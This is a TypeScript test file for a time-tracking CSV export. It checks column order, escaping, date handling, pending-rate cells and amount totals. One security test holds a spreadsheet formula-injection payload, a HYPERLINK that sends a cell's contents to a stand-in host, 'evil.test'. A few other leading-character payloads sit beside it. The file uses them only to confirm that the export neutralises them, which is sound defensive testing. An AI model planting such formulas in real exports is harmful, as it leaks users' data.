/**
 * The bookkeeper's Friday (W5, HT-20) — column order, RFC-4180 escaping, an
 * internal row's empty project cell, a non-org-member roster vendor's row
 * present, and the amount column summing to the ledger total.
 */

import {
  buildTimeExportCsv,
  timeExportTotalCents,
  timeExportFilename,
  type TimeExportRow,
} from "../time-export";
import type { TimeEntryLedgerRow } from "@patina/supabase";

function row(overrides: Partial<TimeExportRow> = {}): TimeExportRow {
  const base: TimeEntryLedgerRow = {
    id: "t1",
    project_id: "p1",
    project_name: "Okonkwo Residence",
    studio_id: "s1",
    user_id: "u1",
    member_name: "Maria Alvarez",
    phase_key: null,
    task_id: null,
    started_at: "2026-09-03T14:00:00Z",
    day: "2026-09-03",
    iso_week: "2026-W36",
    month: "2026-09",
    duration_minutes: 90,
    is_running: false,
    billable: true,
    activity: "design",
    source: "timer_manual",
    billing_state: "authorized",
    rate_source: "studio_member",
    rate_role: "lead_designer",
    resolved_rate_cents: 14_500,
    amount_cents: 21_750,
    invoice_id: null,
    billing_authority_id: null,
    authority_rate_id: null,
    created_at: "2026-09-03T15:30:00Z",
    updated_at: "2026-09-03T15:30:00Z",
  };
  return { ...base, ...overrides };
}

describe("buildTimeExportCsv", () => {
  it("column order — the fixed 14-column header", () => {
    const csv = buildTimeExportCsv([]);
    const [header] = csv.split("\r\n");
    expect(header).toBe(
      [
        "Member",
        "Date",
        "Project",
        "Client",
        "Activity",
        "Billable",
        "Duration (min)",
        "Rate",
        "Rate Source",
        "Rate Role",
        "Amount",
        "Billing State",
        "Invoiced",
        "Invoice #",
      ]
        .map((h) => `"${h}"`)
        .join(","),
    );
  });

  it("RFC-4180 escaping — a value carrying a comma, a quote, and a newline", () => {
    const csv = buildTimeExportCsv([
      row({
        project_name: 'The "Okonkwo, Jr." house\nWing B',
      }),
    ]);
    const lines = csv.trimEnd().split("\r\n");
    expect(lines).toHaveLength(2);
    // The quote is doubled, the comma stays inside the quoted field (so it
    // does not split the column), and the newline is flattened to a space.
    expect(lines[1]).toContain('"The ""Okonkwo, Jr."" house Wing B"');
  });

  it("an internal row's project cell is empty (W4: project_id IS NULL)", () => {
    const csv = buildTimeExportCsv([
      row({ project_id: null as unknown as string, project_name: null }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",");
    // Member, Date, Project, ... — Project is the 3rd column (index 2).
    expect(fields[2]).toBe('""');
  });

  it("an entry by a non-org-member roster vendor is present (the W0 LEFT JOIN payoff)", () => {
    // The ledger's LEFT JOIN to profiles means an author outside the
    // caller's own profiles RLS still produces a row — just with a NULL
    // name — rather than being silently dropped.
    //
    // R3-m1 — and it is NAMED. A blank first cell was an unattributable money
    // row in the accountant's file, and an invited teammate who has not set a
    // display name is the ordinary production shape for it. "Unnamed member"
    // is the word the on-screen rollup has always used (00607).
    const csv = buildTimeExportCsv([row({ member_name: null })]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    expect(dataLine).toBeDefined();
    expect(dataLine.split(",")[0]).toBe('"Unnamed member"');
  });

  // ── HT-13-b — the Date column is the exporting viewer's calendar day ──────
  it("Date takes the caller-supplied local_date, not the ledger's UTC day", () => {
    // The measured shape: an hour the timer filed at 21:34 CDT on the 13th is
    // 2026-09-14 in UTC. Before HT-13-b the accountant's file said the 14th
    // while the designer's own sheet said the 13th.
    const csv = buildTimeExportCsv([
      row({
        started_at: "2026-09-14T02:34:00Z",
        day: "2026-09-14",
        local_date: "2026-09-13",
      }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    expect(dataLine.split(",")[1]).toBe('"2026-09-13"');
  });

  it("Date falls back to the ledger's day when no local_date was supplied", () => {
    // A fallback, not a path: the Hours sheet always supplies one. It exists so
    // a future caller that forgets gets a date rather than an empty cell.
    const csv = buildTimeExportCsv([row({ day: "2026-09-14" })]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    expect(dataLine.split(",")[1]).toBe('"2026-09-14"');
  });

  it("billable/invoiced render as Yes/No, and rate/amount as plain decimal dollars", () => {
    const csv = buildTimeExportCsv([
      row({ billable: false, invoice_id: "inv1", invoice_number: "INV-0007" }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
    expect(fields[5]).toBe("No"); // Billable
    expect(fields[7]).toBe("145.00"); // Rate
    expect(fields[10]).toBe("217.50"); // Amount
    expect(fields[12]).toBe("Yes"); // Invoiced
    expect(fields[13]).toBe("INV-0007"); // Invoice #
  });

  it("the amount column sums to the ledger total, a PRICED pending_authorization row included (M1-r4)", () => {
    const rows = [
      row({ id: "t1", amount_cents: 21_750 }),
      row({ id: "t2", amount_cents: 7_250, member_name: "Leah Brooks" }),
      // M1-r4 — pending_authorization is a fully priced state (00601): the
      // studio rate resolved, only the authorization is outstanding. Its
      // money is real, it must parse, and skipping it here is exactly how a
      // predicate keyed on the wrong column went green while the file's own
      // total stopped tying to the sheet's.
      row({
        id: "t3",
        billing_state: "pending_authorization",
        rate_source: "studio_member",
        resolved_rate_cents: 15_000,
        amount_cents: 30_000,
      }),
    ];
    const csv = buildTimeExportCsv(rows);
    const dataLines = csv.trimEnd().split("\r\n").slice(1);
    const amounts = dataLines.map((line) =>
      line.split(",")[10].replace(/"/g, ""),
    );
    // Every cell parses — none of them is the word "pending".
    expect(amounts).toEqual(["217.50", "72.50", "300.00"]);
    const summed = amounts.reduce(
      (sum, amount) => sum + Math.round(parseFloat(amount) * 100),
      0,
    );
    expect(summed).toBe(timeExportTotalCents(rows));
    expect(summed).toBe(59_000);
  });

  it("a rate-pending hour exports \"pending\" in Rate and Amount, never a confident \"0.00\" (m6-r3)", () => {
    // A billable hour with no rate card resolved yet is a real ledger row
    // whose price is not KNOWN, not a zero-cost one — HT-26's own reason,
    // carried into the file that leaves Patina.
    const csv = buildTimeExportCsv([
      row({
        billing_state: "pending_authorization",
        rate_source: "none",
        resolved_rate_cents: 0,
        amount_cents: 0,
      }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
    expect(fields[7]).toBe("pending"); // Rate
    expect(fields[10]).toBe("pending"); // Amount
    expect(fields[11]).toBe("pending_authorization"); // Billing State unchanged
  });

  it("a pre-00600 legacy row (rate_source null) exports its real snapshot, not \"pending\" (M1-r4)", () => {
    // `rate_source == null` is unrecorded provenance, not "no card found" —
    // the row carries a real rate snapshot and must print it.
    const csv = buildTimeExportCsv([
      row({
        billing_state: "pending_authorization",
        rate_source: null,
        resolved_rate_cents: 14_500,
        amount_cents: 21_750,
      }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
    expect(fields[7]).toBe("145.00"); // Rate
    expect(fields[10]).toBe("217.50"); // Amount
  });

  it("an authorized hour still exports a plain \"0.00\" when its resolved amount really is zero", () => {
    // The pending guard is keyed on the RATE's provenance (M1-r4), not on the
    // figure being zero — a row the resolver priced (rate_source
    // "studio_member") that nets to nothing (e.g. a zero-duration correction)
    // still prints the real number.
    const csv = buildTimeExportCsv([
      row({
        billing_state: "authorized",
        resolved_rate_cents: 0,
        amount_cents: 0,
      }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
    expect(fields[7]).toBe("0.00"); // Rate
    expect(fields[10]).toBe("0.00"); // Amount
  });

  // MS-04 — the three free-text columns are written by people, and `member_name`
  // is written by the person the export is auditing. A leading =, +, -, @ or tab
  // makes Excel and Sheets evaluate the cell.
  it("neutralizes a formula in a self-set member name", () => {
    const csv = buildTimeExportCsv([
      row({ member_name: '=HYPERLINK("https://evil.test?d="&A1,"Total")' }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    expect(dataLine.startsWith(`"'=HYPERLINK(`)).toBe(true);
  });

  it("neutralizes the other four leading characters in project and client", () => {
    for (const hostile of ["+1+1", "-1+1", "@SUM(A1)", "\tcmd"]) {
      const csv = buildTimeExportCsv([
        row({ project_name: hostile, client_name: hostile }),
      ]);
      const [, dataLine] = csv.trimEnd().split("\r\n");
      const fields = dataLine.split('","').map((f) => f.replace(/^"|"$/g, ""));
      expect(fields[2]).toBe(`'${hostile}`); // Project
      expect(fields[3]).toBe(`'${hostile}`); // Client
    }
  });

  // The guard must not turn a bookkeeper's money cell into text.
  it("leaves a plain signed number unguarded", () => {
    const csv = buildTimeExportCsv([
      row({ resolved_rate_cents: -14_500, amount_cents: -21_750 }),
    ]);
    const [, dataLine] = csv.trimEnd().split("\r\n");
    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
    expect(fields[7]).toBe("-145.00"); // Rate
    expect(fields[10]).toBe("-217.50"); // Amount
  });
});

describe("timeExportFilename", () => {
  it("slugifies the scope and stamps the date", () => {
    expect(timeExportFilename("This Studio", "2026-09-12")).toBe(
      "patina-hours-this-studio-2026-09-12.csv",
    );
  });

  it('falls back to "hours" for an empty scope label', () => {
    expect(timeExportFilename("", "2026-09-12")).toBe(
      "patina-hours-hours-2026-09-12.csv",
    );
  });
});
